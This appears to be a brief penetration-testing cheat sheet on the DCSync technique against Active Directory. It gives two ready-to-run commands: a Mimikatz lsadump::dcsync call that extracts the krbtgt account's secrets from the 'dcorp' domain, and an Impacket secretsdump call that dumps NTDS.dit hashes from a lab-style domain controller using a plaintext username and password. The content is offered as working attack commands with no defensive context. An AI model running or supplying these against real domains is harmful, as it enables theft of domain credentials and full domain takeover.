# DC Sync

## Locally

```powershell
# DCSync locally with mimikatz for specific user
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Remotely

```powershell
# Get NTDS.dit via Impacket secretsdump remotely
secretsdump.py -dc-ip 10.10.149.145 spookysec.local/backup:backup2517860@10.10.149.145
```
